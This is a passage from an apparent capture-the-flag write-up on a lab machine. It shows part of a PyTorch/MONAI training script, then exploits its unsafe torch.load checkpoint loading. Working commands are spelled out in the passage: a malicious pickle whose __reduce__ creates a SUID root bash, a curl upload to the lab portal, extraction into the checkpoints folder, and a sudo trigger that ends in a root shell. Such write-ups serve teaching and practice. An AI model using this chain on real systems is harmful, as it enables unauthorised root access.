&#x20;           load\_path=str(latest\_ckpt),

&#x20;           load\_dict={"model": model, "optimizer": optimizer},

&#x20;           map\_location=DEVICE

&#x20;       )



&#x20;       # Minimal mock engine for MONAI handler compatibility

&#x20;       class MockEngine:

&#x20;           def \_\_init\_\_(self):

&#x20;               self.state = type("State", (), {})()

&#x20;               self.state.max\_epochs = None

&#x20;               self.state.epoch = 0



&#x20;       engine = MockEngine()

&#x20;       loader(engine)  # invoke the handler directly



&#x20;       # Retrieve saved epoch if available

&#x20;       if hasattr(engine.state, "epoch") and engine.state.epoch:

&#x20;           start\_epoch = engine.state.epoch

&#x20;       elif hasattr(loader, "loaded\_objects") and "epoch" in loader.loaded\_objects:

&#x20;           start\_epoch = loader.loaded\_objects\["epoch"]



&#x20;       logger.info(f"Resuming from epoch {start\_epoch}")



&#x20;   writer = SummaryWriter(log\_dir=str(LOGS\_DIR / datetime.now().strftime("%Y%m%d-%H%M%S")))



&#x20;   # Training loop

&#x20;   for epoch in range(start\_epoch, NUM\_EPOCHS):

&#x20;       model.train()

&#x20;       epoch\_loss = 0.0

&#x20;       for batch in dataloader:

&#x20;           imgs = batch\["image"].to(DEVICE)

&#x20;           target = torch.zeros((imgs.shape\[0], 1), device=DEVICE)



&#x20;           optimizer.zero\_grad()

&#x20;           out = model(imgs)

&#x20;           loss = loss\_fn(out, target)

&#x20;           loss.backward()

&#x20;           optimizer.step()

&#x20;           epoch\_loss += float(loss.item())



&#x20;       avg\_loss = epoch\_loss / max(1, len(dataloader))

&#x20;       logger.info(f"\[EPOCH {epoch+1}/{NUM\_EPOCHS}] avg\_loss: {avg\_loss:.6f}")



&#x20;       if (epoch + 1) % SAVE\_INTERVAL == 0 or (epoch + 1) == NUM\_EPOCHS:

&#x20;           ckpt\_payload = {

&#x20;               "epoch": epoch + 1,

&#x20;               "model": model.state\_dict(),

&#x20;               "optimizer": optimizer.state\_dict()

&#x20;           }

&#x20;           ckpt\_name = CHECKPOINT\_DIR / f"checkpoint\_epoch\_{epoch+1}.pt"

&#x20;           torch.save(ckpt\_payload, ckpt\_name)

&#x20;           logger.info(f"Saved checkpoint: {ckpt\_name}")



&#x20;   # Save final model

&#x20;   final\_model\_file = MODELS\_DIR / f"final\_model\_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pt"

&#x20;   torch.save({"model": model.state\_dict()}, final\_model\_file)

&#x20;   logger.info(f"Saved final model: {final\_model\_file}")

&#x20;   logger.info("Training completed.")

&#x20;   writer.close()





if \_\_name\_\_ == "\_\_main\_\_":

&#x20;   main()







\[#] When we closely look at this part.......







latest\_ckpt = find\_latest\_checkpoint(CHECKPOINT\_DIR)

if latest\_ckpt:

&#x20;   loader = CheckpointLoader(

&#x20;       load\_path=str(latest\_ckpt),

&#x20;       load\_dict={"model": model, "optimizer": optimizer},

&#x20;       map\_location=DEVICE

&#x20;   )

&#x20;   # ...

&#x20;   loader(engine)  # invoke the handler directly





&#x20;a classic Insecure Deserialization vulnerability. The script is designed to resume training by loading the latest checkpoint file from /datastore/checkpoints/



Under the hood, MONAI's CheckpointLoader utilizes PyTorch's torch.load(). By default, torch.load() uses Python’s pickle module to deserialize .pt files. The pickle module is inherently unsafe for untrusted data because it allows the execution of arbitrary code during the unpickling process via the \_\_reduce\_\_ magic method.





\[#] Then i thought providing a malicious pickle file to the loader would be enough to get Code execution. but that unfortunately wasn't the case here.. the code comes with an intial condition check for /checkpoint/processed directory for processed image data





dataloader, n\_data = prepare\_dataloader\_from\_processed(PROCESSED\_DIR, BATCH\_SIZE)

if n\_data == 0:

&#x20;   # ... tries to promote from staging ...

&#x20;   else:

&#x20;       logger.warning("No data available to train. Exiting.")

&#x20;       return





If the /datastore/processed/ directory is empty, the script exits before it ever reaches the vulnerable CheckpointLoader code. 





\[#] Now if we can write put any image file in the process directory, we can bypass the check. it just needs the presence of any data in the /processed directory. 





developer@bedside:/$ ls -la /datastore

ls: cannot open directory '/datastore': Permission denied





\[#] Unfortunately, the user developer has no access to any of these directories....







\[#] but...but.....but......... User datawrangler, the container do has access to this directory.



datawrangler@data-wrangler:/app$ ls -la /datastore



total 40

drwxrwx--- 8 datawrangler dataops  4096 Jul 13 13:00 .

drwxr-xr-x 1 root         root     4096 Jul 13 13:00 ..

drwxrwx--- 2 datawrangler dataops  4096 Jul 13 13:00 checkpoints

drwxrwx--- 2 datawrangler dataops  4096 Jul 15 23:38 logs

drwxrwx--- 2 datawrangler dataops  4096 Jul 13 13:00 models

drwxrwx--- 2 datawrangler dataops  4096 Jul 13 13:00 processed

drwxrwx--- 2 datawrangler dataops  4096 Jul 13 13:00 raw

drwxrwx--- 2 datawrangler dataops 12288 Jul 26 14:46 staging





\[#] Ahh now this makes things crystal clear for us to plan the attack.....





\[#] Attack planning....





&#x09;1. As tool uses MONAI's checkpointloader, and it uses pytorch's torch.load() under the hood to process pickle files, pickle files are basically checkpoint files designed for 	pytorch only, they used to save and load checkpoints.



&#x09;2. As it processes .pt files we need to make it load our created malicious pickle file as root, we need to particularly store the file at /datastore/checkpoint folder for the 	loader to load it. 





&#x09;3. we also need to create a dummy image to be stored at /datastore/processed to check the initial condition 





&#x09;4. As we can't write the /datastore as user developer, that left the web upload our only vector to submit the pickle file to the server. we need to upload the file as an archive 	because the web portal needs archie upload for processing.



&#x09;5. After uploading the file we need to extract that archive and store the .pt file at /datastore/checkpoint folder.



&#x09;6. and finally the loader will pick the pickle from checkpoint directory and we get our happy code execution as root.





\[#] Okay! sounds good, lets do it....





\[#] Lets start by putting a dummy image at /datastore/processed folder to check the initial exit condition 





\# ON DATAWRANGLER'S SHELL



datawrangler@data-wrangler:/$ cat <<'EOF' | base64 -d > /datastore/processed/valid.png

iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAusB9WlHK4QAAAAASUVORK5CYII=

EOF

&#x20;

\#This is a base64-encoded, valid 1x1 pixel PNG image.











\[#] Now lets craft the exploit.



\# ON DEVELOPER'S SHELL



developer@bedside:\~$ python3 -c 'import torch,os;E=type("E",(),{"\_\_reduce\_\_":lambda s:(os.system,("cp /bin/bash /usr/local/bin/rootbash;chmod 4755 /usr/local/bin/rootbash",))});torch.save(E(),"root.pt")'

&#x09;

\# Whenever the pytorch's torch.load() loads a pickle file, it specifically looks for a magic method \_\_reduce\_\_ and it executes whatever is written in the return method, in this exploit we have written the command to copy the bash binary and sets the SUID bit (4755). When executed, a SUID binary runs with the permissions of its owner (which will be root, since the script runs via sudo).





&#x20;



\[#] Now comes the zipping and Delivery 



\#ON DEVELOPER'S SHELL



developer@bedside:\~$ python3 -c "import zipfile;z=zipfile.ZipFile('root.zip','w');z.write('root.pt');z.close()"



developer@bedside:\~$ curl -s -F 'uploadFile=@root.zip;type=application/zip' http://research.bedside.htb/ >/dev/null





\#we have uploaded the file as an archive to the server via its upload functionality





\[#] Stagging the exploit, we need to extract the zip and place the pickle file at /datastore/checkpoint



\#ON DATAWRANGLER'S SHELL



datawrangler@data-wrangler:/$ python3 -c "import zipfile;zipfile.ZipFile('/var/www/research.bedside.htb/uploads/root.zip').extract('root.pt','/datastore/checkpoints')"





\[#] Update the modification



datawrangler@data-wrangler:/$ touch /datastore/checkpoints/root.pt



\# This is the most common point of failure. The script uses sorted(checkpoint\_dir.glob("\*.pt"), key=os.path.getmtime) to find the latest checkpoint. If root.pt was extracted but an older .pt file exists, the script will load the old one. touch updates the timestamp to right now, guaranteeing it is the newest file.





\[#] Now the final step.. The trigger, we need to execute the bedside\_trainer.py script as root.



developer@bedside:\~$ sudo /usr/bin/python3 /opt/trainer/bedside\_trainer.py



2026-07-26 16:40:02,620 | INFO | Device: cpu

2026-07-26 16:40:02,622 | INFO | Using 1 samples for training.

2026-07-26 16:40:03,052 | INFO | Auto-detected input features: 16384

2026-07-26 16:40:03,071 | INFO | Found checkpoint /datastore/checkpoints/root.pt, loading with CheckpointLoader (callable mode)...

Traceback (most recent call last):

&#x20; File "/opt/trainer/bedside\_trainer.py", line 276, in <module>                                                   

&#x20;   main()

&#x20;   \~\~\~\~^^

&#x20; File "/opt/trainer/bedside\_trainer.py", line 227, in main                                                       

&#x20;   loader(engine)  # invoke the handler directly

&#x20;   \~\~\~\~\~\~^^^^^^^^

&#x20; File "/usr/local/lib/python3.13/dist-packages/monai/handlers/checkpoint\_loader.py", line 146, in \_\_call\_\_       

&#x20;   Checkpoint.load\_objects(to\_load=self.load\_dict, checkpoint=checkpoint, strict=self.strict)                    

&#x20;   \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                    

&#x20; File "/usr/local/lib/python3.13/dist-packages/ignite/handlers/checkpoint.py", line 599, in load\_objects         

&#x20;   raise TypeError(f"Argument checkpoint should be a string or a dictionary, but given {type(checkpoint)}")

TypeError: Argument checkpoint should be a string or a dictionary, but given <class 'int'> 







\[#] Now lets get the shell





developer@bedside:\~$ /usr/local/bin/rootbash -p



\#rootbash-5.2# id

uid=1000(developer) gid=1000(developer) euid=0(root) groups=1000(developer),100(users)



\[!] The '-p' flag is used to preserve the host's SUID,  in the modern bash system If Bash detects that the Real UID does not match the Effective UID, it assumes the execution might be malicious or accidental, and it automatically drops the elevated privileges, resetting the Effective UID back to the Real UID.





\[#] Rooted.......!











